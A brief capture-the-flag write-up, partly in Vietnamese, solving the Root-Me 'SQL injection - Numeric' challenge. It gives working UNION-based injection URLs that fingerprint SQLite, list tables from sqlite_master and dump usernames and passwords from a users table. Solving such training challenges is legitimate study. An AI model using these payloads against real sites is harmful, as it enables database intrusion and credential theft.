# SQL injection - Numeric

\*\*\* Link: http://challenge01.root-me.org/web-serveur/ch18/

## Request

Retrieve the administrator password.

## Solution

Ta sẽ tấn công thông qua GET request

### Step 1: Xem loại database mà trang web đang dùng

- `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 order by 1,2,3,4,5,6`

- `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,sqlite_version(),3`

### Step 2: Tìm tên table:

- `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,tbl_name,3 from sqlite_master`

Tại đây chúng ta thấy table tên là _users_

### Step 3: Get user name and password from users table

- `https://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,username,password from users`
